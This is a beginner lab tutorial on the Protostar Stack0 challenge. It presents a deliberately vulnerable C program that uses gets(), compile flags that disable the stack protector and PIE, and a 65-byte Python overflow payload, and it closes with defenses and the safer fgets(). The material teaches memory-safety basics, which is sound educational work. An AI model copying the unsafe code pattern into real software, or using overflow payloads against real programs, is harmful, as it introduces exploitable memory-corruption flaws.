# Lab 1: Protostar Stack0 - Buffer Overflow Basics

**Time:** 20-30 minutes  
**Difficulty:** Beginner  
**Goal:** Overflow a buffer to change an adjacent variable

---

## Introduction

This is your first buffer overflow. You'll learn:
- What a buffer is
- How overflow affects adjacent memory
- Why `gets()` is dangerous

**The concept:** If you put 100 items in a box that holds 64, the extras spill over and affect whatever is next to the box.

---

## The Vulnerable Program

**Location:** `vulnerable-programs/lab1-protostar/stack0.c`
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    
    modified = 0;
    
    gets(buffer);
    
    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

**What this program does:**

1. Creates a 64-byte buffer: `char buffer[64];`
2. Creates an integer variable set to 0: `modified = 0;`
3. Reads input with `gets(buffer)` - **NO size checking!**
4. Checks if `modified` changed from 0
5. Prints success if `modified` was changed

**The vulnerability:**

`gets()` reads unlimited input. If you enter more than 64 bytes, the extra bytes overflow into adjacent memory - including the `modified` variable.

---

## Memory Layout

**How variables are arranged in memory:**
```
Lower addresses
┌─────────────────┐
│ buffer[0-63]    │  ← 64 bytes for buffer
├─────────────────┤
│ modified        │  ← 4 bytes for integer
└─────────────────┘
Higher addresses
```

**What happens with normal input (e.g., "Hello"):**
```
┌─────────────────┐
│ "Hello\0"       │  ← Only uses 6 bytes
│ (rest empty)    │
├─────────────────┤
│ modified = 0    │  ← Unchanged
└─────────────────┘
```

**What happens with 70 bytes of input:**
```
┌─────────────────┐
│ 64 A's          │  ← Buffer completely filled
├─────────────────┤
│ 6 A's           │  ← Overflow! Overwrites modified!
└─────────────────┘
modified is now 0x41414141 (not zero anymore!)
```

---

## Setup

### Compile the Vulnerable Program
```bash
cd vulnerable-programs/lab1-protostar
gcc -m32 -fno-stack-protector -no-pie -o stack0 stack0.c
```

**Compilation flags explained:**
- `-m32`: Compile for 32-bit (simpler for learning)
- `-fno-stack-protector`: Disable security features
- `-no-pie`: Disable address randomization

---

## Manual Testing

### Test 1: Normal Input
```bash
./stack0
```

Type: `Hello`

**Result:**
```
Try again?
```

The `modified` variable stayed 0 because we only used 6 bytes of the 64-byte buffer.

### Test 2: Exactly 64 Bytes
```bash
python3 -c "print('A' * 64)" | ./stack0
```

**Result:**
```
Try again?
```

Still didn't overflow - we filled the buffer exactly but didn't spill over.

### Test 3: 65+ Bytes (Overflow!)
```bash
python3 -c "print('A' * 65)" | ./stack0
```

**Result:**
```
you have changed the 'modified' variable
```

**Success!** We overflowed the buffer and changed `modified`.

---

## Creating the Exploit

**Location:** `exploits/lab1-protostar/exploit.py`
```python
#!/usr/bin/env python3

# Strategy: Send more than 64 bytes to overflow into 'modified'

# Send 65 A's - the 65th byte overwrites 'modified'
payload = b"A" * 65

# Output to stdout (can be piped to the program)
import sys
sys.stdout.buffer.write(payload)
```

**How it works:**
- First 64 bytes: Fill the buffer
- Byte 65: Overwrites the first byte of `modified`
- Since `modified` is no longer 0, the check passes!

---

## Running the Exploit
```bash
cd exploits/lab1-protostar
python3 exploit.py | ../../vulnerable-programs/lab1-protostar/stack0
```

**Expected output:**
```
you have changed the 'modified' variable
```

---

## Understanding What Happened

**Step-by-step execution:**

1. Program starts, sets `modified = 0`
2. `gets(buffer)` reads 65 bytes from our exploit
3. First 64 bytes fill `buffer[0]` through `buffer[63]`
4. Byte 65 has nowhere to go in the buffer
5. It overflows into the next memory location - `modified`!
6. `modified` is now 0x41 (ASCII 'A') instead of 0
7. The `if(modified != 0)` check is true
8. Success message prints

---

## Key Concepts

### What is a Buffer?

A buffer is a fixed-size area of memory for storing data temporarily. Think of it as a box with a specific capacity.

**Example:**
```c
char buffer[64];  // A box that holds 64 characters
```

### Why is `gets()` Dangerous?

`gets()` reads input until it sees a newline, with NO limit checking:
- Buffer size: 64 bytes
- User input: 1000 bytes
- `gets()` writes all 1000 bytes anyway!

**Safe alternative:** `fgets()` which lets you specify maximum size.

### What is "Adjacent Memory"?

Variables declared one after another are placed next to each other in memory:
```c
char buffer[64];    // Located at address 0x1000
int modified;       // Located at address 0x1040 (right after buffer)
```

When buffer overflows, it writes into `modified`'s space.

---

## Common Questions

**Q: Why 65 bytes? Why not exactly 64?**

A: The buffer holds 64 bytes. To overflow INTO the next variable, you need 64 bytes to fill the buffer PLUS at least 1 more byte to overflow.

**Q: What value does `modified` become?**

A: It becomes whatever bytes you overflow with. Using 'A' (0x41), modified becomes 0x41 or 0x41414141 depending on how many bytes overflow.

**Q: Why use Python to generate the payload?**

A: Easier to generate exact byte counts. Try typing exactly 65 'A's manually - it's error-prone!

**Q: Does it matter what character I use?**

A: No! Any non-zero byte works. 'A' is just convenient and visible in hex dumps.

---

## Experimenting

Try these variations to understand better:

### Experiment 1: Different Lengths
```bash
# 64 bytes - should fail
python3 -c "print('A' * 64)" | ./stack0

# 65 bytes - should succeed
python3 -c "print('A' * 65)" | ./stack0

# 100 bytes - should succeed
python3 -c "print('A' * 100)" | ./stack0
```

**Question:** What's the minimum number of bytes needed?

### Experiment 2: Different Characters
```bash
# Use 'B' instead of 'A'
python3 -c "print('B' * 65)" | ./stack0

# Use '1' (the digit)
python3 -c "print('1' * 65)" | ./stack0
```

**Question:** Does it work with any character?

### Experiment 3: Exact Cutoff
```bash
# Test byte counts: 63, 64, 65, 66
for i in 63 64 65 66; do
    echo "Testing $i bytes:"
    python3 -c "print('A' * $i)" | ./stack0
    echo ""
done
```

**Question:** What is the exact minimum to succeed?

---

## Viewing in GDB (Optional Advanced)

Want to see the overflow happening? Use GDB:
```bash
gdb stack0
```

Inside GDB:
```gdb
(gdb) break main              # Stop at main()
(gdb) run                     # Start program
(gdb) print &buffer           # Show buffer's address
(gdb) print &modified         # Show modified's address
(gdb) quit
```

**Calculate the distance:**
```
Distance = modified_address - buffer_address
Should be 64 bytes (0x40 in hex)
```

---

## Testing Defenses

Now see how defenses prevent this attack:
```bash
cd ../../secure-versions/lab1-protostar-secure
./COMPILE_ALL.sh
./test_defenses.sh
```

**You'll see:**
- v1 (Safe Code): Input validation rejects the overflow
- v2 (Stack Canary): Detects overflow and aborts
- v3 (All Defenses): Multiple layers of protection

**Read:** `DEFENSE_COMPARISON.md` to understand each defense.

---

## What You Learned

**Technical concepts:**
- What a buffer is and how it's stored in memory
- How `gets()` allows unbounded input
- How overflow affects adjacent memory
- Why input validation matters

**Security principles:**
- Never trust user input
- Always check buffer sizes
- Use safe functions (fgets instead of gets)
- Defense in depth

**Skills gained:**
- Compiling vulnerable programs
- Creating simple exploits
- Testing different input sizes
- Understanding memory layout

---

## Next Steps

**Lab 2 (picoCTF):** Learn to control program flow by overwriting return addresses

**Lab 3 (SEED Labs):** Learn to inject and execute your own code (shellcode)

---

## Summary

**The vulnerability:**
- `gets()` has no bounds checking
- Buffer overflow affects adjacent memory
- We overflowed 65 bytes to change `modified` from 0 to non-zero

**The exploit:**
- Send 64 bytes to fill buffer
- Send 1+ more bytes to overflow into `modified`
- Program detects change and prints success

**The lesson:**
Always validate input size before copying into fixed-size buffers.

Congratulations on your first buffer overflow!
